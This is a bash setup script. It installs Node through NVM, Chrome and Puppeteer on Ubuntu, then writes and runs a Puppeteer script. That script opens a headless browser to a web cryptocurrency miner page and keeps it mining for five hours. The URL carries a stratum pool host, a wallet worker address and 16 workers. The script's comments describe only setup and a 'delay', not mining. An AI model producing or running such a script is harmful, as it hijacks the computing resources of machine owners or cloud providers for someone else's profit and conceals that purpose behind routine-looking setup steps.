#!/bin/bash

# Update system Ubuntu
sudo apt-get update -y

# Install NVM (Node Version Manager)
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash

# Source .bashrc to activate NVM
source ~/.bashrc

# Install Node.js version 18 using NVM
nvm install 18

# Install dependencies required for Chrome, Puppeteer, and npx
sudo apt-get install -y \
  gconf-service \
  libasound2 \
  libatk1.0-0 \
  libcups2 \
  libgtk-3-0 \
  libnspr4 \
  libnss3 \
  libxcomposite1 \
  libxcursor1 \
  libxi6 \
  libxtst6 \
  libappindicator3-1 \
  libgbm-dev \
  libxss1 \
  fonts-ipafont-gothic \
  fonts-ipafont-mincho \
  fonts-wqy-zenhei \
  fonts-thai-tlwg \
  fonts-noto \
  fonts-freefont-ttf

# Install Google Chrome
wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo dpkg -i google-chrome-stable_current_amd64.deb || sudo apt-get -f install -y

# Install Puppeteer and npx globally
npm install -g puppeteer npx

# Use npx to install Puppeteer-compatible Chrome
npx puppeteer browsers install

# Create and run Puppeteer script with a 5-hour delay
cat <<EOF > puppeteer_script.js
const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');

  // Set timeout to keep the browser open for 5 hours (18000 seconds)
  setTimeout(async () => {
    console.log('Closing browser after 5 hours.');
    await browser.close();
  }, 18000 * 1000);

  // Wait indefinitely to keep the script running and the browser open
  await new Promise(() => {});
})();
EOF

# Run Puppeteer script using Node.js
node puppeteer_script.js

# Optionally, remove Puppeteer script after execution
# rm puppeteer_script.js
